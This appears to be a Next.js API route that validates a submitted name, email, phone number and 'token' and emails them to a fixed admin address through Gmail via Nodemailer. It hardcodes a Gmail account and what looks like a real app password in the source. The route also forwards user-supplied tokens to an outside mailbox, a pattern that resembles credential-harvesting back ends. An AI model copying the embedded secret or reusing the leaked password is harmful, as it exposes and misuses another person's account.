import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(req) {
  try {
    const { name, email, phone, token } = await req.json();

    // Basic validation
    if (!name || !email || !phone || !token) {
      return NextResponse.json(
        { message: "Please fill all fields" },
        { status: 400 }
      );
    }

    // Additional validation for email and phone format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return NextResponse.json(
        { message: "Please provide a valid email address" },
        { status: 400 }
      );
    }

    const phoneRegex = /^\+[1-9]{1}[0-9]{3,14}$/; // Example: Simple 10-digit phone number validation
    if (!phoneRegex.test(phone)) {
      return NextResponse.json(
        { message: "Please provide a valid phone number" },
        { status: 400 }
      );
    }

    // Send details to email

    // ✅ Configure Nodemailer
    const transporter = nodemailer.createTransport({
      service: "gmail", // Or use SMTP settings for another provider
      auth: {
        user: "unique.theo98@gmail.com", // Your email (use env variables)
        pass: "qhhc qiie ohxh hzrd", // Your email app password (not your real password)
      },
    });

    // ✅ Compose Email
    const mailOptions = {
      from: "unique.theo98@gmail.com",
      to: "0719000292@ttu.edu.gh", // Replace with admin email
      subject: "New Token Submission",
      text: `New submission received:\n\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nToken: ${token}`,
    };

    // ✅ Send Email
    await transporter.sendMail(mailOptions);

    return NextResponse.json(
      { message: "Token received and email sent to admin" },
      { status: 201 }
    );
  } catch (error) {
    console.error("Error processing request:", error);
    return NextResponse.json(
      { message: "Something went wrong, please try again" },
      { status: 500 }
    );
  }
}
